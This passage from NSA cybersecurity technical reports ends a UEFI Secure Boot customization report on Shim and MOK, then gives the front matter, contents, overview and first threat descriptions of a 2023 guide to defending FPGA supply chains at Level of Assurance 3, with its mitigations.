bootloader, kernel, and module. Microsoft signs Shim, Shim sets up MOK, MOK validates the
second bootloader (commonly GRUB), MOK validates the Linux kernel, and MOK validates kernel
modules. Most computing products available today do not ship with a Linux distribution KEK or
DB certificate 
 Shim creates a software solution to a firmware limitation driven by market share.
MOK functions like the DB, and MOKX functions like the DBX. MOK and MOKX extend the
function of DB and DBX, effectively. Remember that DB and DBX are available prior to the
bootloader phase of UEFI boot. However, MOK and MOKX are initialized during the bootloader
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
phase if and only if Shim is used. MOK and MOKX can only be used part-way through the
bootloader phase and in following phases.
What devices ship with UEFI Secure Boot as an option?
Most business and consumer devices intended to run Microsoft Windows support Secure Boot.
Servers, blade arrays, laptops, desktops, tablets/2-in-1s, all-in-one PCs, small form factor PCs,
mobile phones, Internet of Things (IOT) devices, and similar products are likely to have Secure
Boot support. Devices supporting other operating systems may also have unutilized Secure Boot
support.
Where can I get more information, scripts, guidance, strategies, and other resources?
Visit the NSA Cybersecurity GitHub at https://www.github.com/nsacyber/Hardware-andFirmware-Security-Guidance for additional resources. A section specific for Secure Boot is
located
https://www.github.com/nsacyber/Hardware-and-Firmware-SecurityGuidance/tree/master/secureboot. Scripts, use cases, and resources for navigating customization
on a variety of vendor implementations will be posted over time.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency
Cybersecurity Technical Report
DoD Microelectronics:
Field Programmable Gate Array
Level of Assurance 3 Best Practices
June 2023
U/OO/170671-23
PP-23-1734
Version 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
This document was created through collaboration with each of the
JFAC labs: National Security Agency (NSA), Air Force Research
Lab (AFRL) RYDT, Naval Surface Warfare Center (NSWC) Crane,
and Army Development Command (DEVCOM)/AVMC.
For additional information, guidance, or assistance with this
document, please contact the Joint Federated Assurance Center
(JFAC) at JFAC_HWA@radium.ncsc.mil.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Notices and history
Document change history
Date
JUN 2023
Version
Description
Initial Publication
Disclaimer of warranties and endorsement
The information and opinions contained in this document are provided "as is" and without any warranties
or guarantees. Reference herein to any specific commercial products, process, or service by trade name,
trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or
favoring by the United States Government, and this guidance shall not be used for advertising or product
endorsement purposes.
Publication information
Author(s)
National Security Agency
Cybersecurity Directorate
Joint Federated Assurance Center
Contact information
NSA Joint Federated Assurance Center: JFAC_HWA@radium.ncsc.mil
Cybersecurity Report Feedback / General Cybersecurity Inquiries: CybersecurityReports@nsa.gov
Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
Media inquiries / Press Desk: Media Relations, 443-634-0721, MediaRelations@nsa.gov
Purpose
This document was developed in furtherance of NSA
s cybersecurity missions. This includes its
responsibilities to identify and disseminate threats to National Security Systems, Department of Defense
information systems, and the Defense Industrial Base, and to develop and issue cybersecurity
specifications and mitigations. This information may be shared broadly to reach all appropriate
stakeholders.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Executive summary
In support of securing Field Programmable Gate Array (FPGA) based systems from
adversary influence during the manufacturing process, this report outlines the
categories of relevant threats and the best practices for mitigating them at Level of
Assurance 3 (LoA3). LoA3 captures the threats that are technically feasible but have
high cost to implement, in addition to all LoA1 and LoA2 threats. This level is defined as
causing extremely grave harm to U.S. personnel, property, or interests if the systems
fail. At this level, these threats have the following characteristics:
Access 
 Exploit multiple points of difficult access in different areas of the
custom microelectronic components (CMC) supply chain.
Technology 
 Feasible threats for which existing research indicates the
likelihood that technology could be developed with an investment that would be
feasible for a known adversary.
Investment 
 A nation-state scale directed priority requiring resources from
many specialties and organizations across a wide scope to facilitate an attack.
Value of effect 
 Fully or partially degrading a system or feature.
Targetability 
 Affect only a subset of systems.
Organized by threat, this report provides multiple technical mitigations to choose from to
mitigate each threat and to allow the program the best fit for their program needs. The
following table identifies the ten threat descriptions (TD) addressed by this guidance.
Threat description (TD)
TD 1
Adversary utilizes a known FPGA platform vulnerability
TD 2
Adversary inserts malicious counterfeit
TD 3
Adversary compromises application design cycle
TD 4
Adversary compromises system assembly, keying, or provisioning
TD 5
Adversary compromises third-party soft intellectual property (IP)
TD 6
Adversary swaps configuration file on target
TD 7
Adversary substitutes modified FPGA software design suite
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Threat description (TD)
TD 8
Adversary modifies FPGA platform family at design
TD 9
Adversary compromises single-board computing system (SBCS)
TD 10
Adversary modifies vendor FPGA software design suite during
development
Each subsection in this report contains mitigations described in detail to enable clear
implementation. Secondary documents are referenced in cases where the suggested
mitigation is highly detailed, specific to individual FPGA platforms, or subject to frequent
change. In some cases, one hundred percent threat mitigation is not possible. The
provided guidance adds additional layers of protections to increase the difficulty of
malicious action. Additionally, the risks posed by the threat are explained. Appendix D:
Checklists and data/documentation requirements contains a quick reference list of
threats and associated mitigations.
Once the program has mitigated these threats, they have achieved an assurance level
of LoA3.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Contents
DoD Microelectronics: Field Programmable Gate Array Level of Assurance 3
Best Practices .............................................................................................................................i
Executive summary ...................................................................................................................... iv
Contents ...................................................................................................................................... vi
1 Overview of Level of Assurance 3 threats and mitigations.................................................. 1
1.1 Complementary standards and guidance ................................................................................................. 4
1.2 Exclusions ............................................................................................................................................................. 5
1.3 Document use ...................................................................................................................................................... 6
1.4 General comments on mitigations ............................................................................................................... 7
2 Threat descriptions (TD) ........................................................................................................... 7
TD 1: Adversary utilizes a known FPGA platform vulnerability .............................................. 7
TD 1 mitigations .......................................................................................................................................................... 8
TD 1 mitigation descriptions .................................................................................................................................. 8
Use caution when selecting tools or platforms .......................................................................................... 8
Use cleared personnel ........................................................................................................................................ 8
Research vulnerabilities...................................................................................................................................... 8
Use revision control/version management .................................................................................................. 9
Enforce auditability ............................................................................................................................................. 10
Enforce the approved design process ........................................................................................................ 10
TD 2: Adversary inserts malicious counterfeit ....................................................................... 11
TD 2 mitigations ........................................................................................................................................................ 13
TD 2 mitigation descriptions ................................................................................................................................ 13
Purchase from DoD authorized vendors and distributors ................................................................... 13
Consult GIDEP ..................................................................................................................................................... 13
Follow storage and shipping guidance ....................................................................................................... 14
Verify the FPGA cryptographically secure identifier .............................................................................. 14
Perform physical inspection/analysis .......................................................................................................... 17
Cleared insider ..................................................................................................................................................... 20
TD 3: Adversary compromises application design cycle ...................................................... 21
TD 3 mitigations ........................................................................................................................................................ 22
Use Secret level cleared personnel ............................................................................................................. 23
Track critical data in a revision control system ........................................................................................ 23
Enforce auditability ............................................................................................................................................. 23
Use revision control/version management ................................................................................................ 24
TD 3.1 Mitigating the introduction of a compromised design into the application .......................... 24
Isolate and store the application design ..................................................................................................... 25
Perform reproducible build .............................................................................................................................. 25
TD 3.2 Mitigating the modification of test benches or plans to reduce coverage or hide Trojan
code ............................................................................................................................................................................... 26
Execute a documented test plan ................................................................................................................... 26
Validate and verify the test processes ........................................................................................................ 27
Maintain test environment via configuration management ................................................................. 27
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 3.3 Mitigating the introduction of a Trojan into the application design during
development ............................................................................................................................................................... 27
Maintain bi-directional links to approved requirements ........................................................................ 27
Enforce peer review ........................................................................................................................................... 28
Execute a documented test plan ................................................................................................................... 28
Implement, validate, and verify test processes ....................................................................................... 29
Select a formal 
proof
 process...................................................................................................................... 29
TD 3.4 Mitigating the introduction of compromised tooling or software into the environment .. 30
Validate cryptographic hashes ....................................................................................................................... 30
Research vulnerabilities.................................................................................................................................... 30
Validate tools ......................................................................................................................................................... 31
TD 3.5 Mitigating intrusion into the internal network .................................................................................. 32
Assign roles ........................................................................................................................................................... 33
Control and monitor access ............................................................................................................................ 33
Research vulnerabilities.................................................................................................................................... 33
Use a secret or classified network ................................................................................................................ 34
TD 3.6 Mitigating risk from a compromised employee .............................................................................. 34
Enforce auditability ............................................................................................................................................. 34
Enforce the approved design process ........................................................................................................ 35
Review critical design activities ..................................................................................................................... 35
Use cleared personnel ...................................................................................................................................... 35
TD 3.7 Mitigating risk associated with the compromise of device identifiers ................................... 35
Store device identifiers ...................................................................................................................................... 36
Limit access to device identifier information ............................................................................................. 36
TD 4: Adversary compromises system assembly, keying, or provisioning ........................ 36
TD 4 mitigations ........................................................................................................................................................ 37
TD 4 mitigation descriptions ................................................................................................................................ 38
Purchase from DoD authorized vendors and distributors ................................................................... 38
Follow storage and shipping guidance ....................................................................................................... 38
Provide keys and configuration data ........................................................................................................... 39
Clear memory devices....................................................................................................................................... 39
Provision private keys........................................................................................................................................ 39
Protect the configuration data package ...................................................................................................... 39
Perform verification activities .......................................................................................................................... 39
Authenticate the FPGA device ....................................................................................................................... 40
TD 5: Adversary compromises third-party soft IP .................................................................. 41
TD 5 mitigations ........................................................................................................................................................ 41
TD 5 mitigation descriptions ................................................................................................................................ 42
Purchase from DoD authorized vendors and distributors ................................................................... 42
Only accept IP that is unobfuscated ............................................................................................................ 42
Ensure IP deliverable packages are digitally signed............................................................................. 42
Validate the cryptographic hash .................................................................................................................... 42
Store IP in a revision control repository...................................................................................................... 42
Examine IP for malicious functions .............................................................................................................. 43
TD 6: Adversary swaps configuration file on target ............................................................... 43
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 6 mitigations ........................................................................................................................................................ 44
TD 6 mitigation descriptions ................................................................................................................................ 45
Incorporate cryptographic authentication .................................................................................................. 45
Authenticate configuration data each time the data is loaded .......................................................... 45
Prevent direct read back................................................................................................................................... 45
Use a CNSS/NIST approved algorithm and key length ....................................................................... 45
Use DoD evaluated authentication mechanisms.................................................................................... 45
Disable test access pins ................................................................................................................................... 46
Ensure authentication for modifications ..................................................................................................... 46
Use a FIPS 140-2 compliant, Level 2 HSM .............................................................................................. 48
TD 7: Adversary substitutes modified FPGA software design suite .................................... 48
TD 7 mitigations ........................................................................................................................................................ 49
TD 7 mitigation descriptions ................................................................................................................................ 49
Purchase from DoD authorized vendors and distributors ................................................................... 49
Prevent automatic tool updates ..................................................................................................................... 49
Use a trusted computing environment ........................................................................................................ 49
Use cleared personnel ...................................................................................................................................... 50
Validate the cryptographic hash .................................................................................................................... 50
Validate the tool output ..................................................................................................................................... 50
TD 8: Adversary modifies FPGA platform family at design ................................................... 51
TD 8 mitigations ........................................................................................................................................................ 52
TD 8 mitigation description ................................................................................................................................... 52
Engage JFAC........................................................................................................................................................ 52
TD 9: Adversary compromises single-board computing system (SBCS) ........................... 53
TD 9 mitigations ........................................................................................................................................................ 53
TD 9 mitigation descriptions ................................................................................................................................ 54
Engage a DoD vendor to build the SBCS ................................................................................................. 54
Verification and authentication ....................................................................................................................... 54
Authenticate the FPGA devices..................................................................................................................... 54
Verify the SBCS configuration process ...................................................................................................... 54
Test non-volatile memory ................................................................................................................................. 55
Document the steps ........................................................................................................................................... 55
TD 10: Adversary modifies vendor FPGA software design suite during development ..... 55
TD 10 mitigations ..................................................................................................................................................... 56
TD 10 mitigation descriptions .............................................................................................................................. 56
Perform logical equivalency checking ......................................................................................................... 56
3 Summary ................................................................................................................................... 57
Appendix A: Standardized terminology ................................................................................... 58
Appendix B: IP Reuse Guidance ............................................................................................... 61
Reuse conditions ...................................................................................................................................................... 61
Reuse scenarios ....................................................................................................................................................... 62
Appendix C: JFAC FPGA reporting template .......................................................................... 65
Appendix D: Mitigations and data/documentation requirements ......................................... 69
Checklist for TD 1: Adversary utilizes a known FPGA platform vulnerability ................................... 69
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
viii
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Checklist for TD 2: Adversary inserts malicious counterfeit.................................................................... 71
Checklist for TD 3: Adversary compromises application design cycle ............................................... 74
Checklist for TD 4: Adversary compromises system assembly, keying, or provisioning ............ 83
Checklist for TD 5: Adversary compromises third-party soft IP ............................................................. 85
Ensure IP deliverable packages are digitally signed............................................................................. 86
Checklist for TD 6: Adversary swaps configuration file on target ......................................................... 87
Checklist for TD 7: Adversary substitutes modified FPGA software design suite.......................... 88
Checklist for TD 8: Adversary modifies FPGA platform family at design .......................................... 90
Checklist for TD 9: Adversary compromises single-board computing system (SBCS) ............... 90
Checklist for TD 10: Adversary modifies vendor FPGA software design suite during
development ............................................................................................................................................................... 92
Tables
Table 1: LoA3 threats ................................................................................................................................................. 3
Table 2: List of AS6171 slash sheets............................................................................................................... 17
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
1 Overview of Level of Assurance 3 threats and
mitigations
LoA3
This document provides JFAC
s recommended hardware assurance strategies
for Field Programmable Gate Array (FPGA) devices. The guidance outlined by this
document provides hardware assurance to systems requiring Level of Assurance 3
(LoA3). Additionally, it provides the requisite strategies and details for implementing
each threat mitigation. Secondary documents are referenced in cases where the
suggested mitigation is highly detailed, specific to individual FPGA platforms, or subject
to frequent change.
This guidance is meant to stand on its own and not require the participation of JFAC in
the development process of a program
s product, unless required by a specific
mitigation. However, JFAC does remain at the ready to aid programs who seek to better
understand this guidance, to incorporate a program specific mitigation or are seeking
alternatives to the guidance contained herein. For further information or support, please
visit the JFAC portal at https://jfac.navy.mil.
In addition, to threats and mitigations identified at LoA1 and LoA2, LoA3 requires
mitigations against FPGA assurance threats that have the following characteristics:
Access 
 Multiple points of difficult access in different areas of the custom
microelectronic components (CMC) supply chain.
This could include multiple people working on different elements of the CMC or
government design teams.
This could include multiple people performing different functions in the fabrication
process.
This could include single or multiple cleared insiders working on the same or
different parts of the supply chain.
For a mitigation based on access to be effective, it needs to make it considerably more
difficult to carry out the attack. Examples include necessitating multiple points of difficult
access via many cleared people in conjunction with attacking multiple areas of the
supply chain such that actors will need coordination and communication amongst the
group.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Technology 
 Technologically feasible threats for which existing research indicates
the likelihood that technology could be developed with an investment that would be
feasible for a known adversary. However, these threats may not be associated with
existing and/or known tools and may not have associated reporting indicating adversary
activity. Moreover, while all the threats are validated to be possible, it may be that there
is no known or ongoing investment in the capability.
For a mitigation based on technological complexity to be effective, it must increase the
level of technology needed to carry out the attack to that which is beyond what is
recognized as technically feasible and practical. This includes areas for which there is
no known research.
Investment 
 A nation-state scale directed priority refers to a substantive program
conducted by a nation state that coordinates resources from many specialties and
organizations across a wide scope to facilitate an attack.
For a mitigation based on investment of resources to be effective, it must force the
attacker to expend greater resources that would be daunting even for a nation-state.
Value of Effect 
 Degrade system performance are those effects that reduce the
behavior of a system without fully disabling any specific feature or reliably having a
specific planned effect. Note, that the term degradation may be used in some domains
in a different way. For instance, a communications link might be 
degraded
 in a way
that prevents all communication. Such an attack would fall under disabling a capability
for the purposes of this evaluation. In addition, this LoA must consider all higher value
effects described in LoA1 and LoA2.
For a mitigation based upon value of effect to the adversary to be effective in LoA3, it
must eliminate or substantially reduce the value to the attacker.
Targetability 
 Blind attacks refers to attacks that impact large numbers of parts,
whole device families, or users in a way that has a significant likelihood of discovery
without effort, but only to impact a specifically targeted part. Blind attacks are those
where it is hard to predict the interaction between what adversaries do and the intended
consequence of the attack. This could include attacks that are performed against far
more targets than expected, or with an intelligent agent that acts without an outside
trigger or without foreknowledge of the attack outcome that would inform the adversary
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
of its execution. These attacks can also include activation times that cannot be
controlled once fielded; that is to say, a pre-determined time at which devices will fail.
For a mitigation based on targetability to be effective, it must remove the ability of the
adversary to affect targeted systems and force the adversary to rely on general and
blind attacks.
For a program to achieve Level of Assurance 3, it must provide mitigations against
threats that possess these characteristics. Of prime importance in LoA3 is the assumed
presence of one or more compromised cleared insiders and allowance for attacks that
are not targeted, but broadly applied to the entire supply chain. These new conditions
render classified facilities and cleared people ineffective as a 
sole
 means of mitigation.
As such, many of the mitigations offered in this guide focus on nullifying this adversarial
advantage using dual or independent teams. LoA3 addresses threats that originate from
an adversary whose intent is malicious, but unlike the previous LoA levels also includes
cases where reliability is also compromised. These threats should be addressed by the
reliability testing of a program. For programs with stringent or specific reliability
requirements, it is strongly recommended that the appropriate level of testing be
conducted to ensure the proper operation of the product rather than relying on
assurance mitigations.
The following table lists the ten FPGA threats that are addressed by LoA3. Each threat
is explained and accompanied by examples in more detail within the JFAC FPGA Best
Practices 
 Threat Catalog.
Table 1: LoA3 threats
Threat description (TD)
TD 1
Adversary utilizes a known FPGA platform vulnerability
TD 2
Adversary inserts malicious counterfeit
TD 3
Adversary compromises application design cycle
TD 4
Adversary compromises system assembly, keying, or provisioning
TD 5
Adversary compromises third-party soft intellectual property (IP)
TD 6
Adversary swaps configuration file on target
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Threat description (TD)
TD 7
Adversary substitutes modified FPGA software design suite
TD 8
Adversary modifies FPGA platform family at design
TD 9
Adversary compromises single-board computing system (SBCS)
TD 10
Adversary modifies vendor FPGA software design suite during
development
Each threat listed here has corresponding mitigations. These mitigations are derived
from various commercial/government standards and existing best practices. The use of
these standards/best practices should not preclude the use of any other standards or
best practices. In particular, DoD projects identified as National Security Systems (NSS)
should also utilize the appropriate guidance as required by the Committee on National
Security Systems (CNSS) Policy 15 and other CNSS documents.
1.1 Complementary standards and guidance
Microelectronic quantifiable assurance (MQA) standards are intended to be
complementary to other government and industry recognized risk management
practices and standards. The following are standards for various mitigations:
CNSS Policy on the use of Commercial Solutions to Protect National Security
Systems Policy 7
CNSS Cryptographic Key Protection Policy 30
National Institute of Standards and Technology (NIST) Federal Information
Processing Standards (FIPS) Publication 186 Digital Signature Standard
NIST FIPS Publication 198 The Keyed-Hash Message Authentication Code
(HMAC)
NIST Special Publication (SP) 800-53 Security and Privacy Controls for Federal
Information Systems and Organizations
NIST SP 800-57 Recommendation for Key Management
The Department of Defense Cybersecurity Maturity Model Certification (CMMC)
The Configuration Management section of NIST SP 800-60 Systems Security
Engineering: Considerations for a Multidisciplinary Approach in the Engineering
of Trustworthy Secure Systems
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
NIST SP 800-171 Protecting Controlled Unclassified Information in Nonfederal
Systems and Organizations
NIST SP 800-172 Enhanced Security Requirements for Protecting Controlled
Unclassified Information.
SAE International AS6171 Test Methods Standard; General Requirements,
Suspect/Counterfeit, Electrical, Electronic and Electromechanical Parts
Trusted Systems and Network (TSN) Analysis
Defense Acquisition Guidebook Chapter Nine 
 Program Protection Plan
JFAC FPGA Best Practices Documents 
 contact JFAC for available documents
to support implementation practices for the FPGA standards in this guide
Program offices should review and adhere to the standards provided in each document,
as applicable. The standards and guidance contained in this best practice guide do not
supersede any other DoD acquisition requirement or other DoD mandate. Additionally,
programs are encouraged to apply applicable standards in addition to the standards
described in this document
1.2 Exclusions
This FPGA Level of Assurance 3 Best Practice guide does not address the following
concerns:
Non-malicious and profit driven reliability risks such as re-marked parts.
Programs are responsible for establishing and enforcing system reliability
requirements. This document will not include guidance on how to conduct
reliability testing. However, compliance with SAE International AS6171 Test
Methods Standard: General Requirements Suspect/Counterfeit, Electrical,
Electronic and Electromechanical Parts as recommended by this report is an
effective detection mechanism for these kinds of counterfeit parts.
Threats to the confidentiality of the application design. The program application
can be loaded apart from the manufacturing process and under the protection
and oversight of the program. Confidentiality is preserved using existing
engineering practices, bitstream encryption and other anti-tamper practices. For
more guidance in this area, see the DoD
s Anti-tamper Executive Agent
(https://at.dod.mil).
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
1.3 Document use
These FPGA assurance best practices instruct programs on protecting manufacturing
and provisioning processes from adversarial influence. Specifically, they apply to the
manufacturing, acquisition, programming and first attachment of the FPGA devices. The
program must define its own protection methods as boards become integrated into
subcomponents, components, and then final systems.
For LoA3 compliance, each program should perform each mitigation listed in the 
Mitigation
 section. The 
Mitigations Description
 section provides details for each
mitigation. Underlined text in a listing indicates that there is a following section providing
full details for implementing the protection. In some cases, the full description contains
multiple technical options for mitigating the threat to be LoA3 compliant. An asterisk 
next to any mitigation indicates that multiple technical options exist. In those cases, at
least one option must be implemented.
When mitigations for all the threats listed under LoA3 are completed, that device can be
said to have achieved LoA3. However, compliance with LoA3 can be impacted by
changes in several areas during the system
s life.
The Program Protection Plan (PPP) emphasizes the need to maintain and update
protection measures throughout lifecycle of a program. It is strongly recommended that
each program identify events that would trigger a review of the PPP and the hardware
assurance practices after fielding. These events should include but not be limited to:
Changes to the system
Changes to the supplier of critical components including the FPGA devices
Changes to the FPGA design software (new releases, fixes, etc.),
Changes to the threat environment
Revelations of new vulnerabilities to the FPGA devices
The PPP documents list resources with which the program can track the latest available
intelligence on threats and supply chain vulnerabilities. Changes in any of these areas
should trigger a review of the most up-to-date assurance mitigations against the
triggering event. If threats or vulnerabilities threaten the system, new mitigations should
be implemented to remain compliant to LoA3. Absent any changes in these areas, the
devices should be considered to have achieved LoA3.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
1.4 General comments on mitigations
Programs are encouraged to own as much of the assembly process as possible
and avoid third parties to the fullest extent possible.
Programs are encouraged to diversify their supply sources to minimize malicious
targeting.
Programs are encouraged to use cleared personnel and classified resources to
the fullest extent possible.
Programs are encouraged to use verification of all manufacturing steps to the
fullest extent possible. This applies to packaging and assembly.
2 Threat descriptions (TD)
TD 1: Adversary utilizes a known FPGA platform vulnerability
In this threat, an adversary utilizes a vulnerability in an FPGA platform or vendor
development software package to initiate an attack. At LoA3, a vulnerability is defined
as a weakness known to the adversary in the design of a specific FPGA platform or
software program that would allow the ability to use it for malicious purposes. The
vulnerability could be publicly or non-publicly known.
Vulnerabilities could allow for the leakage of sensitive information or keys, compromise
of security or tamper detection functions, or unauthorized reconfiguration of the product.
Unclassified and public vulnerabilities are published in databases, such as the DISA
Vulnerability Management System (VMS), 
Common Vulnerabilities and Exposures
(CVE)
, and the 
National Vulnerabilities Database (NVD)
, vendor advisories, errata
bulletins, etc. Non-public vulnerabilities refer to ones that have been discovered by the
adversary's research or known by vendors but not exposed to the public.
This threat can be realized when a program does not perform vulnerability research or
an insider hides the fact of the vulnerability such that it may be used for nefarious
purposes or by adding/modifying design features for use with or for triggering the
vulnerability.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
TD 1 mitigations
Use caution when selecting tools or platforms. When possible do not select tools
or platforms that are end-of-life or beta/initial releases. Also, ensure previously
identified vulnerabilities in tools/platforms have been adequately addressed in
newer releases.
Use cleared personnel that possess at least a Secret level clearance.
*Research vulnerabilities affecting tools/platforms.
Use revision control/version management that includes document/data control,
document/data release, backups, and archives, refresh of backup media,
retention of tools and software, test equipment and test environment.
Enforce auditability of the requirements, architecture, design, code, tests, bugs,
and fixes. At a minimum, audit data should include what decisions were made, by
whom, for what reason, and on what date.
Adopt, document, and enforce the approved design process that is
organizationally approved and with clear entry and exit criteria. Entry and exit
criteria incorporate peer reviews and technical reviews with management
approval to exit a phase.
TD 1 mitigation descriptions
Use caution when selecting tools or platforms
Consider the longevity of selected tools and FPGA platforms. Newly released devices
may not yet have a vulnerability history. Programs should proceed with caution when
using newly released devices or tools. End-of-life devices may not have support to
mitigate vulnerabilities once identified.
Use cleared personnel
Use personnel with at least a Secret clearance to perform designated work. Designated
work could include design reviews, peer reviews, vulnerability research, validation, and
verification activities, etc.
Research vulnerabilities
Research the respective FPGA platform and software for existing vulnerabilities in
databases such as:
Common Vulnerabilities and Exposures (CVE) 
 https://cve.mitre.org
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
NIST National Vulnerabilities Database (NVD) 
 https://nvd.nist.gov
Government Industry Data Exchange Program (GIDEP) 
https://www.gidep.org/products/products.htm
DISA Security Technical Implementation Guides (STIGs) 
https://public.cyber.mil/stigs/
Search vendor advisories, errata, publications, and academic papers detailing
vulnerabilities in the device in question.
Contact the vendor field application engineer for unreleased or pre-release
vulnerability reports.
If vulnerabilities are found in the FPGA device, choose one of the following options:
Option 1: Select a different FPGA platform device or software that does not have
published vulnerabilities and that meets the program requirements.
Option 2: Use standard formal processes and procedures to work with the vendor to
resolve the vulnerability. Once a fix is identified, only accept formal releases, do not
accept custom beta fixes, custom patches, etc. for incorporation; or
Option 3: The program can internally determine the vulnerability poses no significant
risk to their product. JFAC is available to provide assistance in assessing the risk that
the vulnerability poses to the system and acquire recommended mitigations for a
particular vulnerability.
Note: If a vulnerability is identified, JFAC recommends reporting it to DISA and to
contact the vendor so they may correct it.
Use revision control/version management
To prevent vulnerable software from being loaded into the environment, it is important
that robust configuration management and revision control systems are in place. All
changes to the system and/or any artifacts should be documented, approved, and
auditable.
These systems should fulfill the following requirements:
Allow only authorized system administrators to make changes to the underlying
revision control tool and underlying server.
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
Use a backup system that syncs to the primary and is maintained by a separate
administrator. Each system should be managed by separate system
administrators.
Enforce administrative restrictions; restrict privileged access to authorized
personnel only; limit what users can do to the database; ensure all users are
verified; encrypt database information
both in transit and at rest; enforce secure
passwords; enforce role-based access control and privileges; and remove
unused accounts.
Remove any components or functions that are not necessary (for example,
remove all sample files and default passwords).
Ensure the system provides a complete and immutable, long-term change history
of every file. The system must log every change made by individuals. This
includes changes such as creating and deleting files and editing content. The
history must identify the person who made the change, what was changed, the
date of the change, and the purpose of the change.
Ensure the system stores a reliable copy of assets that are currently in
production.
Ensure the system stores reliable copies of previous production versions of
assets, allowing for the complete retrieval of those versions.
Ensure password best practices (password rotation, length, etc.) are enforced. In
lieu of a password, two-factor authentication can be utilized.
Ensure the final application synthesis and bitstream generation configuration
settings are captured and stored.
All changes to the system and/or any artifacts should be documented, approved,
and auditable.
Enforce auditability
Enforce auditability of the requirements, architecture, design, code, tests, bugs, and
fixes. At a minimum, audit data includes what decisions were made, by whom, for what
reason, and on what date. System audits and logs are required where applicable.
Enforce the approved design process
The design process should include the identification of all assurance critical activities
and highlight how each activity will be reviewed. The design process should ensure the
design is reviewed by multiple cleared individuals. The original designer should not be
the responsible party for performing the review. The cleared reviewers should assess
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
the satisfaction of all requirements, ensure no extraneous design elements, and review
all vulnerability activities, including identification of vulnerabilities and the
appropriateness of the mitigations. Additionally, the design process should contain clear
entry and exit criteria that incorporate peer reviews and technical reviews with
management approval required to exit a phase.
TD 2: Adversary inserts malicious counterfeit
LoA1 addresses counterfeit parts made in an unauthorized fabrication facility and
inserted into the supply chain. These parts mimic the behavior of the target device, but
are manufactured in a process differing from the authorized one. Insertion of counterfeit
parts can happen during any part of the device's lifecycle. This includes prior to
purchase, in transit, while in storage by the program, during assembly, and at
distribution prior to fielding.
In addition to the LoA1 threats, LoA2 addresses counterfeit parts made in an authorized
fabrication facility through the malicious compromise of the manufacturing process.
Such an attack could happen during any of the following phases of the process:
Transfer of graphic
design system 2
(GDSII) mask data
Mask fabrication
Mask storage
Wafer manufacturing
Package testing
Wafer testing
Wafer dicing and
packaging
Device
personalization
LoA2 also includes counterfeit parts created in an adversary facility purposely built to
mimic the authorized device manufacturing process, as well as the insertion of a
malicious function into the package of an authentic device. This includes:
insertion of a snooping die stacked in the package,
introduction of a kill switch in the package, or
alteration of the bond out to compromise some FPGA feature.
LoA3 adds counterfeit parts fabricated in the authorized fabrication facility using stolen
authorized GDSII under a different product name. It can also include the introduction of
a reliability and performance degradation due to an attack on the manufacturing process
or the remarking of used devices. The modification of the original design to insert a
malicious function could be considered a 
counterfeit
 part, but will be addressed
U/OO/170671-23 | PP-23-1734 | JUN 2023 Ver. 1.0
National Security Agency | Cybersecurity Technical Report
DoD Microelectronics: FPGA Level of Assurance 3 Best Practices
separately in TD 8: Adversary modifies FPGA platform family at design. The difference
between this new threat in TD 2 in LoA3 and TD 8 is that, for this threat, there exists a
golden, unaltered (known good) representation of the design in the GDSII. For TD 8, the
malicious function is baked into the design and cannot be exposed by any comparison
to a golden model.
